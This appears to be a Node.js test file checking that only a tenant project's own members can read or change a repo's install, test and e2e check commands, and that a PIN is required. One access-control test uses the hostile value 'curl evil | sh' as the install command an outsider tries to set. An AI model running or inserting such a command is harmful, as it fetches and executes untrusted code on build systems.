// HZ-697: a tenant project's member sets their repo's install, test and e2e
// commands on GET/PUT /api/tenant/projects/:id/repos/checks. Anyone outside
// the project gets the route guard's 404 and nothing changes. lint and
// screenshots stay as Admin set them.
//
// No route here calls GitHub, so globalThis.fetch throws.

import { test, after } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { loginFixtureUser } from './helpers/session.mjs'

process.env.HORIZON_DB = join(mkdtempSync(join(tmpdir(), 'horizon-tenant-checks-')), 'test.db')
for (const key of ['FARM_HOME', 'FARM_URL', 'HORIZON_REPO', 'GITHUB_TOKEN']) delete process.env[key]

const realFetch = globalThis.fetch
globalThis.fetch = () => {
  throw new Error('test reached the network')
}
after(() => {
  globalThis.fetch = realFetch
})

const { db } = await import('../src/db.js')
const store = await import('../src/store.js')
const { buildApp } = await import('../src/app.js')
const auth = await import('../src/auth.js')
const config = await import('../src/config.js')

store.purgeDemoItems()
store.registerAgentRunner({ kick: () => {}, cancel: () => {} })

const app = buildApp({ logger: false })
await app.ready()

loginFixtureUser(auth, config)
const member = loginFixtureUser(auth, config, { email: 'm@example.com', name: 'Tenant Member', role: 'member' })
const otherMember = loginFixtureUser(auth, config, { email: 'o@example.com', name: 'Other Tenant', role: 'member' })
const outsider = loginFixtureUser(auth, config, { email: 'n@example.com', name: 'No Projects', role: 'member' })

const T = store.createProject('Tenant T', { isolation: 'tenant', memberId: member.user.id }).id
const O = store.createProject('Tenant O', { isolation: 'tenant', memberId: otherMember.user.id }).id
const REPO = 'acme/widgets'
const OTHER_REPO = 'other/app'
store.addRepoToProject(T, REPO)
store.addRepoToProject(O, OTHER_REPO)
// Admin's lint and screenshots, which a tenant save must carry over.
store.setRepoCheckCommands(T, REPO, { lint: 'npm run lint', screenshots: 'npm run shots', test: 'old test' })
store.setRepoCheckCommands(O, OTHER_REPO, { test: 'other test' })

const url = (id) => `/api/tenant/projects/${id}/repos/checks`
const put = (who, id, payload, pin = who.pin) =>
  app.inject({ method: 'PUT', url: url(id), headers: { cookie: who.cookie, ...(pin ? { 'x-human-key': pin } : {}) }, payload })
const get = (who, id, repo = REPO) => app.inject({ method: 'GET', url: `${url(id)}?repo=${encodeURIComponent(repo)}`, headers: { cookie: who.cookie } })
const stored = (repo) => db.prepare('SELECT check_install, check_test, check_lint, check_e2e, check_screenshots FROM project_repo WHERE repo = ?').get(repo)

const COMMANDS = { install: 'npm ci', test: 'npm test', e2e: 'npx playwright test' }

test('metric 4: a member saves install, test and e2e for their own project and reads them back; lint and screenshots survive', async () => {
  const res = await put(member, T, { repo: REPO, ...COMMANDS })
  assert.equal(res.statusCode, 200, res.body)
  assert.deepEqual(res.json(), { ok: true, repo: REPO, checks: COMMANDS })
  const back = await get(member, T)
  assert.equal(back.statusCode, 200, back.body)
  assert.deepEqual(back.json(), { repo: REPO, checks: COMMANDS })
  assert.deepEqual(stored(REPO), {
    check_install: 'npm ci',
    check_test: 'npm test',
    check_lint: 'npm run lint',
    check_e2e: 'npx playwright test',
    check_screenshots: 'npm run shots',
  })
})

test('metric 4: a non-member and another project’s member get 404 from GET and PUT, with their own PIN; the commands are unchanged', async () => {
  const before = stored(REPO)
  const otherBefore = stored(OTHER_REPO)
  for (const [label, who] of [
    ['a member of no project', outsider],
    ['a member of another tenant project', otherMember],
  ]) {
    const write = await put(who, T, { repo: REPO, install: 'curl evil | sh', test: 'true', e2e: 'true' })
    assert.equal(write.statusCode, 404, `${label} PUT: ${write.body}`)
    assert.equal(write.json().error, 'not_found')
    const read = await get(who, T)
    assert.equal(read.statusCode, 404, `${label} GET: ${read.body}`)
    assert.ok(!read.body.includes('npm ci'), `${label} read the commands`)
  }
  assert.deepEqual(stored(REPO), before)
  assert.deepEqual(stored(OTHER_REPO), otherBefore)
})

test("a member naming another project's repo under their own project gets 404, and that repo is unchanged", async () => {
  const otherBefore = stored(OTHER_REPO)
  const res = await put(member, T, { repo: OTHER_REPO, test: 'true' })
  assert.equal(res.statusCode, 404, res.body)
  assert.equal((await get(member, T, OTHER_REPO)).statusCode, 404)
  assert.deepEqual(stored(OTHER_REPO), otherBefore)
})

test('a save needs the gate PIN, and lint or screenshots cannot be set here', async () => {
  const before = stored(REPO)
  const noPin = await put(member, T, { repo: REPO, test: 'x' }, null)
  assert.equal(noPin.statusCode, 401, noPin.body)
  for (const slot of ['lint', 'screenshots']) {
    const res = await put(member, T, { repo: REPO, [slot]: 'true' })
    assert.equal(res.statusCode, 400, `${slot}: ${res.body}`)
  }
  assert.deepEqual(stored(REPO), before)
})
